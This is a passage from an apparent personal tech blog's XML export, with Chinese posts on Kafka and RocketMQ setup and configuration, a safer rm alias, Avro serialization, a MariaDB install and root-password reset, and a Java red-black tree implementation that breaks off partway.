      <tags>
        <tag>RocketMQ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rocketmq简介]]></title>
    <url>%2F2018%2F12%2F05%2Fmessage-queue%2Frocketmq%2F01%2F</url>
    <content type="text"><![CDATA[背景 互联网应用拆分为微服务、解决各个微服务模块的互相通信问题、并能够提供大流量技术支撑 {———-} 应用场景 微服务之间的通信问题 具体的业务场景有很多、比如、支付完成后的订单状态修改、用户充值后的vip等级提升、物流信息等等 各个微服务之间的消息、业务场景有：按实时性可分为实时消息、非实时消息； 组成部件 rocketmq 有两个部件 nameserver：服务管理中心、broker：消息存储中心 nameserver管理业务服务注册、保证服务稳定运行 broker负责消息的持久化、保证消息不丢失 解决问题 应用解耦 替换应用上的https协议、又能保证服务之间的动态性 流量削峰 非即时消息、延后处理 消息分发 消息生产者只负责消息生产、消息消费者只负责消息消费、只管把消息发到消息队列、而不关心、哪台服务消费这个消息 消息轮询消费、不会造成只在某一台机器上消费、压跨服务器 保证分布式事务的最终一致性 动态扩容 发展 目前已是apache的顶级项目、 2017年双十一的主要驱动力、处理消息万亿级别、tps:5600万 java语言开发、对java开发者亲和度较高 技术选型 rocketmq、rabbitmq、kafka 没有谁好谁坏 kafka起源最早、解决消息流处理问题、最早解决监控平台对各个服务模块的消息监控、 rabbitmq、采用AMQP协议开发、建立了最早的消息模型、定义了消息驱动模式、 rocketmq、类似于kafka、不过语言是java、经历了阿里的双十一足以证明它的性能。 个人见解 吞吐量优先、消息丢失小事、选择kafka、kafka的吞吐量要强一个量级 稳定不丢消息：rocketmq、tabbitmq、 rabbitmq底层是erlang语言、erlang语言特性、并发性能优秀、 rocketmq底层netty、异步机制优秀 实时性要求高、同时又要求高的吞吐量 rabbitmq 非实时性要求高、同时又要求高吞吐量 rocketmq]]></content>
      <categories>
        <category>java</category>
        <category>message-queue</category>
        <category>rocketmq</category>
      </categories>
      <tags>
        <tag>RocketMQ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[app版本更新]]></title>
    <url>%2F2018%2F12%2F04%2Fversion%2Fversion-1%2F</url>
    <content type="text"><![CDATA[app版本更新 v1.1.0 下载地址 新增分享功能 更新微信分享 选择性微信朋友圈和微信好友分享 修复返回直接退出问题 v1.0.0 下载地址 下载次数 {———-}]]></content>
      <categories>
        <category>app</category>
        <category>version</category>
      </categories>
      <tags>
        <tag>app版本更新</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kafka构建数据管道需要注意的问题]]></title>
    <url>%2F2018%2F12%2F01%2Fmessage-queue%2Fkafka%2F09%2F</url>
    <content type="text"><![CDATA[kafka构建数据管道需要注意的问题 及时性 可靠性 高吞吐量和动态吞吐量 数据格式 转换 安全性 故障处理能力 耦合性和灵活性 {———-} 及时性 在业务需求变更时、具有不同及时性需求的数据之间可以方便的进行迁移 数据支持实时性处理、也支持延迟批处理 消费者可以实时拉取处理、也可以延迟批量处理一批数据 可靠性 能够在各种故障中快速回复 支持、至少一次传递【本身支持】 支持、仅一次传递、避免幂等消费【需结合实物模型或者唯一键特性的外部存储系统】 高吞吐量和动态吞吐量 自动伸缩功能 管理员可以调整压缩来网络和存储资源的使用【支持多种类型压缩】 数据格式 avro、xml也可以使用自定义 读取数据源schema载入数据 转换 ETL【提取、转换、加载】 过滤掉部分数据、为下游服务过滤不必要数据信息 缺点、下游的调整可能需要重新调整数据管道 ELT【提取、加载、转换】 高保真数据管道、数据湖结构 占用了目标系统太多的CPU和存储资源、使得目标系统造价高昂、不过也给下游保证了最原始的数据、利于调整需求 安全性 支持加密数据、 支持认证【SASL实现】、授权消费 支持数据追踪、时间来源、事件修改者、日志审计、访问记录 故障处理能力 数据保留一周、一月、任意时间以便于追溯 耦合性和灵活性 临时数据管道 常用数据管道 logstash—–&gt; elasticsearch flume——&gt; HDFS GoldenGate——&gt;Oracle mysql【xml】——–&gt;Informatica——-&gt;oracle 当有新的需求时候有需要重新构建新的管道、增加新技术成本 元数据丢失 元数据没有保留schema数据、导致数据交换过程中、没有处理元数据新增字段【因为新的schema中没有该字段】 而如果数据管道允许修改schema信息、那么双方只需要修改内部数据处理就可以了 末端处理 让下端可以自己决定数据处理、而不是数据管道直接处理、直接处理会对下游数据的完整性造成破坏同时新的需求更迭、也会造成成本提升]]></content>
      <categories>
        <category>java</category>
        <category>message-queue</category>
        <category>kafka</category>
      </categories>
      <tags>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kafka集群复制]]></title>
    <url>%2F2018%2F11%2F30%2Fmessage-queue%2Fkafka%2F08%2F</url>
    <content type="text"><![CDATA[kafka集群复制 kafka数据结构 kafka请求处理流程 kafka消息格式 {———-} kafka集群复制kafka数据结构 kafka是以主题来组织数据 每个主题下有多个分区、每个分区下有多个副本【数据元】、 【玩过 mongodb 和 elasticsearch 的一看就懂、一个东西】 每个broker可以存储不同主题和不同分区的副本 副本分为两种 首领副本【数据存储、对接客户端请求、消费】 跟随者副本【数据备份、不处理来自客户端的任何请求、待首领挂掉、迅速顶上】 另、首领还会处理副本的备份请求、以判断哪个副本是最新的、最新的版本才可以当“储君” 图纸解说 照了一张差不多的图、不是kafka的、是es的 不过解释起来足够了 主节点 node3、为broker协调者 所有数据都是一个主题topic通过tag来区分数据【一般一个应用要给同topic、这里就当1个多个tag、】 每个tag下有很多数据、每个数据有多个副本、【这里配置就2个、一个首领副本、一个跟随着副本】 kafka请求处理流程图纸解说 请求通过processor线程发向请求队列、处理IO逻辑、将响应发向响应队列 kafka消息格式 Request type 【API key】 Request version 【version版本号】 Correlation ID【消息唯一id】 Client ID【客户端唯一id】]]></content>
      <categories>
        <category>java</category>
        <category>message-queue</category>
        <category>kafka</category>
      </categories>
      <tags>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kafka消费者接收和配置]]></title>
    <url>%2F2018%2F11%2F29%2Fmessage-queue%2Fkafka%2F07%2F</url>
    <content type="text"><![CDATA[kafka消息接收方式 kafka消息偏移量提交 kafka序列化 kafka消费者配置 {———-} kafka消息接收方式 kafka有两种消息接收方式、1:主动拉取、2:服务器端推送 1234567891011121314151617181920212223242526272829303132/** * kafka消费者 */public void test04() &#123; Properties properties = new Properties(); properties.put(&quot;bootstrap.servers&quot;, &quot;broker1:9002,broker2:9002&quot;); properties.put(&quot;group.id&quot;, &quot;CountryCounter&quot;); properties.put(&quot;key.deserializer&quot;, &quot;org.apache.kafka.common.serialization.StringDeserializer&quot;); properties.put(&quot;value.deserializer&quot;, &quot;org.apache.kafka.common.serialization.StringDeserializer&quot;); KafkaConsumer&lt;String, String&gt; consumer = new KafkaConsumer&lt;String, String&gt;(properties); //订阅主题 consumer.subscribe(Collections.singletonList(&quot;customerCountries&quot;)); //订阅所有主题 consumer.subscribe(Collections.singletonList(&quot;test.*&quot;)); try &#123; while (true) &#123; ConsumerRecords&lt;String, String&gt; records = consumer.poll(100); for (ConsumerRecord&lt;String, String&gt; record : records) &#123; logger.debug(&quot;topic=%s,partition=%s,offset=%d,constomer=%s,country=%s\n&quot;, record.topic(),record.partition(),record.offset(),record.key(),record.value()); //todo 执行消费逻辑 &#125; &#125; &#125; catch (Exception e) &#123; &#125;&#125; kafka消息偏移量提交 提交已处理消息标记位 kafka序列化 kafka使用avro序列化 可以看这边文章、Apache Avro kafka消费者配置 fetch.min.bytes 指定消费者从服务器获取记录的最小字节数 fetch.max.wait.ms 累积多少时间把数据返还给消费者 数值大、吞吐量大、延迟高、 数值小、吞吐量小、延迟低、 max.partition.fetch.bytes 指定每个分区返给消费者的最大字节数、默认值1MB 如果有20个分区、5个消费者、那么这里就可以配置4MB 该值一定要大于broker能够接收数据最大值、否则会一直挂起重试 session.timeout.ms 指定消费者在被认为死亡之前可以与服务器断开连接时间、默认3s 如果规定时间内没有发送心跳、认为死亡、触发再均衡 auto.offset.reset 指定 消费者在读取一个没有偏移量的分区或者偏移量无效情况下（因消费者长时间失效、包含偏移量的记录已经过时并被删除）该如何处理 默认值 latest、最新数据 earliest 在偏移量无效情况下、消费者将从起始位置读取分区记录【幂等消费？】 enable.auto.commit 指定消费者是否自动提交偏移量 默认值true partition.assignment.strategy 指定分配主题分区给消费者的分配策略 Range 轮询、如果分区数量大于消费者数量、那么排在前面的消费者会被分配到更多的分区 RoundRobin 给消费者分配更加平等数量的分区、或者最多小差一个分区 client.id 分区id 标识分区唯一、以及客户端、识别消息、也被用在日志和度量指标和配额里 max.poll.records 指定单次调用call()方法能够返回的记录数量 receive.buffer.bytes、send.buffer.bytes socket在读写数据时用到的TCP缓冲区 -1使用系统默认值 如果消费者和生产者不再统一数据中心内、可以适当增大该值 kafka消费者注意点 消费者数量大于主题分区数量、否则消费者会被闲置；比如5个主题分区、4个消费者、那么会有一个主题分区会被闲置 再均衡 分区所有权从一个消费者转移到另一个消费者、这样的行为被称为再均衡 再均衡期间、消费者不能消费消息 也是这样的设置、能是消费者分区能动态增减 维持：消费者通过向消费者协调者broker发送心跳、来维持他们与群组的从属关系以及他们对分区的所有权关系 消费者死亡、消费协调者broker会等待几秒钟、确认死亡后会触发再均衡]]></content>
      <categories>
        <category>java</category>
        <category>message-queue</category>
        <category>kafka</category>
      </categories>
      <tags>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kafka生产者发送和配置]]></title>
    <url>%2F2018%2F11%2F28%2Fmessage-queue%2Fkafka%2F06%2F</url>
    <content type="text"><![CDATA[kafka消息发送 kafka消息同步发送 kafka消息异步发送 kafka生产者配置 {———-} kafka消息发送123456789101112/** * 最简单发送 */ public void test01() &#123; ProducerRecord&lt;String, String&gt; record = new ProducerRecord&lt;&gt;(&quot;CustomerCountory&quot;, &quot;Precision Products&quot;, &quot;France&quot;); try &#123; producer.send(record); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; kafka消息同步发送1234567891011121314/** * kafka同步发送 */public void test02() &#123; ProducerRecord&lt;String, String&gt; record = new ProducerRecord&lt;&gt;(&quot;CustomerCountory&quot;, &quot;Precision Products&quot;, &quot;France&quot;); try &#123; Future result = producer.send(record); result.get(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125;&#125; kafka消息异步发送123456789101112131415161718192021/** * kafka 异步发送 */public void test03()&#123; ProducerRecord&lt;String, String&gt; record = new ProducerRecord&lt;&gt;(&quot;CustomerCountory&quot;, &quot;Precision Products&quot;, &quot;France&quot;); try&#123; Future result = producer.send(record,new DemoProducerCallback()); result.get(); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125;&#125;public class DemoProducerCallback implements Callback &#123; @Override public void onCompletion(RecordMetadata recordMetadata, Exception e) &#123; &#125;&#125; kafka生产者配置 acks acks = 0 不回调通知 acks = a 只保存首领节点、即返回消息确认 acks = all 保存首领节点和所有副节点后、即返回消息确认 buffer.memory 设置生产者内存缓存大小、生产者又来缓冲发送到服务器的消息、 0.9.00版本中、被替换为max.block.ms 表示抛出异常前可以阻塞一段时间 compression.type 消息压缩、可设置为snappy、gzip、lz4 指定消息被发送给broker之前使用哪一种压缩算法进行压缩 retries 重试次数 默认每次重试等待100ms、可以通过retry.backoff.ms 设置 一般首领选举中易发生重试、建议该时间大于选举时间、崩溃恢复时间长等 batch.size 消息批次大小、累积到一定大小发送消息 linger.ms 指定生产者在发送批次之前等待更多消息加入批次时间 消息发送两个控制点、一个是累计大小、一个是这个时间、规定时间内没有达到累积值、也要发送消息 client.id 可以设置任意字符串 服务器用来判断消息来源、用来标记消息 max.in.flight.requests.pre.connection 指定、生产者在受到服务器响应之前可以发送多少个消息、 值越高、就会占用更多内存、也会提升吞吐量、 设置为1 可保证消息桉顺序写入broker服务器 timeout.ms、request.timeout.ms、metadata.fetch.timeout.ms timeout.ms 生产者发送数据时等待服务器返回响应时间 request.timeout.ms 指定生产者在获取元数据（比如broker首领是谁）等待服务器返回响应时间、超时重试 metadata.fetch.timeout.ms 指定 broker等待同步副本返回消息确认时间、超时认为失败 max.block.ms 指定调用send方法或者使用partitionFor()方法获取元数据生产者的阻塞时间 超时抛出异常 max.request.size 控制生产者发送消息大小、单个请求大小、单个请求中一个批次消息的总大小 receive.buffer.bytes、send.buffer.bytes tcp、socket的接收和发送缓冲区大小 kafka顺序 可设置max.in.flight.request.pre.connection = 1、但会严重影响吞吐量 这点或许rabbitmq和rocketmq做的更好]]></content>
      <categories>
        <category>java</category>
        <category>message-queue</category>
        <category>kafka</category>
      </categories>
      <tags>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kafka数据流向图]]></title>
    <url>%2F2018%2F11%2F27%2Fmessage-queue%2Fkafka%2F05%2F</url>
    <content type="text"><![CDATA[kafka简单集群 kafka生产者 kafka消费者 {———-} kafka简单集群 kafka生产者 kafka消费者]]></content>
      <categories>
        <category>java</category>
        <category>message-queue</category>
        <category>kafka</category>
      </categories>
      <tags>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kafka集群]]></title>
    <url>%2F2018%2F11%2F26%2Fmessage-queue%2Fkafka%2F04%2F</url>
    <content type="text"><![CDATA[需要多少个broker broker配置 操作系统调优 虚拟内存 磁盘 网络 {———-} 需要多少个broker 两个因素：需要多少磁盘空间来保留数据、单个broker有多少空间可用 例：复制系数为1，整个集群要保留10TB数据、每个broker可以保留2TB、那么需要5个broker、复制系数为2，那就需要10个broker broker配置 两个必须配置项：zookeeper.connect 、broker.id 整个集群连接一个服务管理中心、每个broker.id 集群内唯一、如果重复第二个启动会失败 操作系统调优 虚拟内存 kafkaa会利用虚拟机内存做页面缓存、减少与磁盘交互数据、减小延迟 一般虚拟内存都会根据软件所需内存分配内存、如果分配不到了就是没有更多内存了 磁盘 EXT4 XFS：提供更好的性能、不需要额外的调优、批量磁盘写入具有更高的效率、可以提升整体IO吞吐量,现linux发行版多采用该磁盘、较少的调优可以获取更大的工作负荷 网络 tcp缓冲区 socket缓冲区 tcp时间窗 可以增加客户端传输数据效率、 net.ipv4.tcp_max_syn_backlog设置大于1024 可以接收更多的并发连接 net.core.netdev_max_backlog设置大于1000 有助于应对网络流量爆发、能允许更多的数据包排队等待内核处理]]></content>
      <categories>
        <category>java</category>
        <category>message-queue</category>
        <category>kafka</category>
      </categories>
      <tags>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kafka硬件选择]]></title>
    <url>%2F2018%2F11%2F25%2Fmessage-queue%2Fkafka%2F03%2F</url>
    <content type="text"><![CDATA[磁盘吞吐量 磁盘容量 内存 网络 CPU {———-} 磁盘吞吐量 直接因素-影响生产者 磁盘写入越快、生成消息延迟越低 磁盘容量 如果每天存储消息量为1TB 、保存周期为7天、那么就需要7TB 除此之外还要保留10%额外空间 内存 直接因素-影像消费者 运行kafka不需要jvm太大内存、大部分内存作为页面缓存、或者kafka日志片段 内存过低会影响消费者性能 网络 直接因素-影响吞吐量 当内存瓶颈和磁盘瓶颈不存在的时候、如果网络服务接口成为瓶颈也会大大降低消费者和生产者的性能 CPU kafka对cpu性能要求较低、但也不是随便就能糊弄 kafka有自己的消息压缩和解压、都需要使用cpu进行计算 另 无论什么时候cpu都涉及到并发性能]]></content>
      <categories>
        <category>java</category>
        <category>message-queue</category>
        <category>kafka</category>
      </categories>
      <tags>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kafka安装]]></title>
    <url>%2F2018%2F11%2F24%2Fmessage-queue%2Fkafka%2F02%2F</url>
    <content type="text"><![CDATA[官网 下载12345678910111213##前置java、zookeeperwget http://mirror.bit.edu.cn/apache/kafka/2.1.0/kafka_2.12-2.1.0.tgzorcurl -L -O http://mirror.bit.edu.cn/apache/kafka/2.1.0/kafka_2.12-2.1.0.tgztar -zxvf kafka_2.12-2.1.0.tgzcd kafka_2.12-2.1.0/bin {———-} 启动1234567891011121314./kafka-server-start.sh -daemon./kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test#test 主题上发布消息./kafka-console-producer.sh --broker-list localhost:9092 --topic test#test 主题上接收消息./kafka-console-consumer.sh --zookeeper localhost:2181 --topic test --from-beginning broker配置1、broker.id 集群唯一 整数 2、port 端口 3、zookeeper.connect zk连接地址 4、log.dirs log地址 5、num.recovery.threads.pre.data.dir 配置线程处理日志片段 服务器正常启动、用于打开每个分区的日志片段 服务器崩溃后重启、用于检查和截短每个分区的日志片段 服务器正常关闭、用于关闭日志片段 默认每个日志目录只用一个线程、如果配置了num.recovery.threads.pre.data.dir=8那么如果有3个log.dir 那么就需要24个线程 6、auto.create.topics.enable 默认情况下、kafka会在以下三种情况下自动创建主题 当一个生产者开始往主题写入消息时 当一个消费者开始从主题读取消息时 当任意一个客户端向主题发送元数据请求时 如果已经显示的创建主题、那么这里可以配置为auto.create.topics.enable=false topic默认配置1、num.partitions 选定分区数量 2、log.retention.ms 根据时间保留数据和最后修改时间 3、log.retention.bytes 根据字节大小和时间保留数据 4、log.segment.bytes 使用时间戳获取偏移量 5、log.segment.ms 基于时间的日志片段和磁盘性能的影响 6、message.max.bytes 在服务端和客户端之间协调消息大小的配置]]></content>
      <categories>
        <category>java</category>
        <category>message-queue</category>
        <category>kafka</category>
      </categories>
      <tags>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kafka简介]]></title>
    <url>%2F2018%2F11%2F23%2Fmessage-queue%2Fkafka%2F01%2F</url>
    <content type="text"><![CDATA[背景 kafka最初为limkedIn的一个内部基础服务 最早的设计观念是、把数据看作流、消费者、订阅和发布各种各样的消息、这在大数据上应用非常广泛 组成部件 一个部件broker、每一个broker就是一个单独的服务器 每一个集群有一个broker作为集群控制器角色【分区选举】、与rocketmq区别是、rocketmq使用了nameserver作为注册中心 多级群中、kafka提供了一个mirrorMaker工具实现集群间消息复制 mirroMaker核心部分是一个生产者一个消费者、中间是一个队列、也是kafka的最基本原理、实际上在复杂的集群环境中、对于数据的可靠性更复杂些 {———-} 发展 kafka的愿景做一个数据生态系统、提供消息发布和消息订阅、 使用场景 活动跟踪、点击量 传递消息 度量指标和日志记录 提交日志 流处理 结合hadoop做数据流的队列 技术选型 rocketmq、rabbitmq、kafka 没有谁好谁坏 kafka起源最早、解决消息流处理问题、最早解决监控平台对各个服务模块的消息监控、 rabbitmq、采用AMQP协议开发、建立了最早的消息模型、定义了消息驱动模式、 rocketmq、类似于kafka、不过语言是java、经历了阿里的双十一足以证明它的性能。 个人见解 吞吐量优先、消息丢失小事、选择kafka、kafka的吞吐量要强一个量级 稳定不丢消息：rocketmq、tabbitmq、 rabbitmq底层是erlang语言、erlang语言特性、并发性能优秀、 rocketmq底层netty、异步机制优秀 实时性要求高、同时又要求高的吞吐量 rabbitmq 非实时性要求高、同时又要求高吞吐量 rocketmq]]></content>
      <categories>
        <category>java</category>
        <category>message-queue</category>
        <category>kafka</category>
      </categories>
      <tags>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rabbitmq简介]]></title>
    <url>%2F2018%2F11%2F23%2Fmessage-queue%2Frabbitmq%2F01%2F</url>
    <content type="text"><![CDATA[{———-} 技术选型 rocketmq、rabbitmq、kafka 没有谁好谁坏 kafka起源最早、解决消息流处理问题、最早解决监控平台对各个服务模块的消息监控、 rabbitmq、采用AMQP协议开发、建立了最早的消息模型、定义了消息驱动模式、 rocketmq、类似于kafka、不过语言是java、经历了阿里的双十一足以证明它的性能。 个人见解 吞吐量优先、消息丢失小事、选择kafka、kafka的吞吐量要强一个量级 稳定不丢消息：rocketmq、tabbitmq、 rabbitmq底层是erlang语言、erlang语言特性、并发性能优秀、 rocketmq底层netty、异步机制优秀 实时性要求高、同时又要求高的吞吐量 rabbitmq 非实时性要求高、同时又要求高吞吐量 rocketmq]]></content>
      <categories>
        <category>java</category>
        <category>message-queue</category>
        <category>rabbitmq</category>
      </categories>
      <tags>
        <tag>RabbitMQ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux 删除命令 rm 改为 mv]]></title>
    <url>%2F2018%2F11%2F15%2Fshell%2Fshell-5%2F</url>
    <content type="text"><![CDATA[非常实用 rm Linux下修改rm命令为mv，使rm命令原有功能失效 1vim ~/.bashrc 1234567891011mkdir -p ~/.trash #在家目录下创建一个.trash文件夹alias rm=del #使用别名del代替rm del() #函数del，作用：将rm命令修改为mv命令&#123; mv $@ ~/.trash/ &#125; cleardel() #函数cleardel，作用：清空回收站.trash文件夹，y或Y表示确认，n表示取消&#123; read -p &quot;clear sure?[Input &apos;y&apos; or &apos;Y&apos; to confirm. &amp;&amp; Input &apos;n&apos; to cancel.]&quot; confirm [ $confirm == &apos;y&apos; ] || [ $confirm == &apos;Y&apos; ] &amp;&amp; /bin/rm -rf ~/.trash/* &#125; {———-} 然后 加载配置 1source ~/.bashrc 清空回收站1cleardel 注：rm命令已经删除，所以要彻底删除文件的话，可以先del删除文件到垃圾箱，然后进入~/.trash文件夹使用cleardel命令来彻底清除垃圾箱里的所有文件。]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache avro 序列化]]></title>
    <url>%2F2018%2F11%2F10%2Fessay%2Favro%2F</url>
    <content type="text"><![CDATA[序列化当前序列化最常用的两种数据格式 json xml jsonwiki 常用包 jackson 、gson 【google】、fastjson【alibaba】 xmlXML现在用的比较少、起源比json要早很多、有点类似与html应该是依据html的dom树形式创建的一套信息序列化 现在不常用了，原因是占用文件大部分内容的都是标签语言、实际有效信息占比太少 {———-} Avro最近看kafka 组件 解决 服务端与客户端序列化问题是 看到这种解决方案 avro 文中也提到要想实现一种自己的序列化格式太难、需要考虑版本兼容、服务消费端和服务提供者都对序列化样式兼容文中推荐了这个序列化方式 Avro 另 之前在研究 es搜索引擎 对于es的sql也是使用avro序列化方式 可以说是比较不错的一种解决方案 12345678910&#123; &quot;namespace&quot;: &quot;com.wuxinvip.data&quot;, &quot;type&quot;: &quot;record&quot;, &quot;name&quot;: &quot;User&quot;, &quot;fields&quot;: [ &#123;&quot;name&quot;: &quot;name&quot;, &quot;type&quot;: &quot;string&quot;&#125;, &#123;&quot;name&quot;: &quot;address&quot;, &quot;type&quot;: [&quot;string&quot;, &quot;null&quot;]&#125; ]&#125; 这种序列化 采用了一种注册表方式 双方都从注册表中获取一个schema 标准然后采用这种标准来解析数据形式类似于json 不过补充了json在迭代上的不足]]></content>
      <categories>
        <category>java</category>
        <category>序列化</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[centos7.4 MariaDB 安装]]></title>
    <url>%2F2018%2F11%2F05%2Fmysql%2Fmysql-mariadb%2F</url>
    <content type="text"><![CDATA[123456789101112131415yum install mariadb mariadb-server==&gt; 启动mariadbsystemctl start mariadb ==&gt; 开机自启动systemctl enable mariadb ==&gt; 设置 root密码等相关mysql_secure_installation ==&gt; 测试登录！mysql -uroot -p 会遇到的问题mysql_secure_installation 输入密码 验权失败 12345678910111213141516关闭服务service mysql stop重置rootmysqld_safe --skip-grant-tables &amp;登录mysql -u root切换databaseuse mysql;修改密码update user SET PASSWORD=PASSWORD(&quot;&lt;my_new_password&gt;&quot;) WHERE USER=&apos;root&apos;; 刷新权限表flush privileges;退出 exit;]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>MariaDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java 红黑树]]></title>
    <url>%2F2018%2F11%2F01%2Fjdk%2Fjdk-tree%2F</url>
    <content type="text"><![CDATA[(1) 除了上面所说的”左旋”、”右旋”、”添加”、”删除”等基本操作之后，还实现了”遍历”、”查找”、”打印”、”最小值”、”最大值”、”创建”、”销毁”等接口。(2) 函数接口大多分为内部接口和外部接口。内部接口是private函数，外部接口则是public函数。(3) 测试代码中提供了”插入”和”删除”动作的检测开关。默认是关闭的，打开方法可以参考”代码中的说明”。建议在打开开关后，在草稿上自己动手绘制一下红黑树。 {———-} 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689/** * Java 语言: 红黑树 */public class RBTree&lt;T extends Comparable&lt;T&gt;&gt; &#123; private RBTNode&lt;T&gt; mRoot; // 根结点 private static final boolean RED = false; private static final boolean BLACK = true; public class RBTNode&lt;T extends Comparable&lt;T&gt;&gt; &#123; boolean color; // 颜色 T key; // 关键字(键值) RBTNode&lt;T&gt; left; // 左孩子 RBTNode&lt;T&gt; right; // 右孩子 RBTNode&lt;T&gt; parent; // 父结点 public RBTNode(T key, boolean color, RBTNode&lt;T&gt; parent, RBTNode&lt;T&gt; left, RBTNode&lt;T&gt; right) &#123; this.key = key; this.color = color; this.parent = parent; this.left = left; this.right = right; &#125; public T getKey() &#123; return key; &#125; public String toString() &#123; return &quot;&quot;+key+(this.color==RED?&quot;(R)&quot;:&quot;B&quot;); &#125; &#125; public RBTree() &#123; mRoot=null; &#125; private RBTNode&lt;T&gt; parentOf(RBTNode&lt;T&gt; node) &#123; return node!=null ? node.parent : null; &#125; private boolean colorOf(RBTNode&lt;T&gt; node) &#123; return node!=null ? node.color : BLACK; &#125; private boolean isRed(RBTNode&lt;T&gt; node) &#123; return ((node!=null)&amp;&amp;(node.color==RED)) ? true : false; &#125; private boolean isBlack(RBTNode&lt;T&gt; node) &#123; return !isRed(node); &#125; private void setBlack(RBTNode&lt;T&gt; node) &#123; if (node!=null) node.color = BLACK; &#125; private void setRed(RBTNode&lt;T&gt; node) &#123; if (node!=null) node.color = RED; &#125; private void setParent(RBTNode&lt;T&gt; node, RBTNode&lt;T&gt; parent) &#123; if (node!=null) node.parent = parent; &#125; private void setColor(RBTNode&lt;T&gt; node, boolean color) &#123; if (node!=null) node.color = color; &#125; /* * 前序遍历&quot;红黑树&quot; */ private void preOrder(RBTNode&lt;T&gt; tree) &#123; if(tree != null) &#123; System.out.print(tree.key+&quot; &quot;); preOrder(tree.left); preOrder(tree.right); &#125; &#125; public void preOrder() &#123; preOrder(mRoot); &#125; /* * 中序遍历&quot;红黑树&quot; */ private void inOrder(RBTNode&lt;T&gt; tree) &#123; if(tree != null) &#123; inOrder(tree.left); System.out.print(tree.key+&quot; &quot;); inOrder(tree.right); &#125; &#125; public void inOrder() &#123; inOrder(mRoot); &#125; /* * 后序遍历&quot;红黑树&quot; */ private void postOrder(RBTNode&lt;T&gt; tree) &#123; if(tree != null) &#123; postOrder(tree.left); postOrder(tree.right); System.out.print(tree.key+&quot; &quot;); &#125; &#125; public void postOrder() &#123; postOrder(mRoot); &#125; /* * (递归实现)查找&quot;红黑树x&quot;中键值为key的节点 */ private RBTNode&lt;T&gt; search(RBTNode&lt;T&gt; x, T key) &#123; if (x==null) return x; int cmp = key.compareTo(x.key); if (cmp &lt; 0) return search(x.left, key); else if (cmp &gt; 0) return search(x.right, key); else return x; &#125; public RBTNode&lt;T&gt; search(T key) &#123; return search(mRoot, key); &#125; /* * (非递归实现)查找&quot;红黑树x&quot;中键值为key的节点 */ private RBTNode&lt;T&gt; iterativeSearch(RBTNode&lt;T&gt; x, T key) &#123; while (x!=null) &#123; int cmp = key.compareTo(x.key); if (cmp &lt; 0) x = x.left; else if (cmp &gt; 0) x = x.right; else return x; &#125; return x; &#125; public RBTNode&lt;T&gt; iterativeSearch(T key) &#123; return iterativeSearch(mRoot, key); &#125; /* * 查找最小结点：返回tree为根结点的红黑树的最小结点。 */ private RBTNode&lt;T&gt; minimum(RBTNode&lt;T&gt; tree) &#123; if (tree == null) return null; while(tree.left != null) tree = tree.left; return tree; &#125; public T minimum() &#123; RBTNode&lt;T&gt; p = minimum(mRoot); if (p != null) return p.key; return null; &#125; /* * 查找最大结点：返回tree为根结点的红黑树的最大结点。 */ private RBTNode&lt;T&gt; maximum(RBTNode&lt;T&gt; tree) &#123; if (tree == null) return null; while(tree.right != null) tree = tree.right; return tree; &#125; public T maximum() &#123; RBTNode&lt;T&gt; p = maximum(mRoot); if (p != null) return p.key; return null; &#125; /* * 找结点(x)的后继结点。即，查找&quot;红黑树中数据值大于该结点&quot;的&quot;最小结点&quot;。 */ public RBTNode&lt;T&gt; successor(RBTNode&lt;T&gt; x) &#123; // 如果x存在右孩子，则&quot;x的后继结点&quot;为 &quot;以其右孩子为根的子树的最小结点&quot;。 if (x.right != null) return minimum(x.right); // 如果x没有右孩子。则x有以下两种可能： // (01) x是&quot;一个左孩子&quot;，则&quot;x的后继结点&quot;为 &quot;它的父结点&quot;。 // (02) 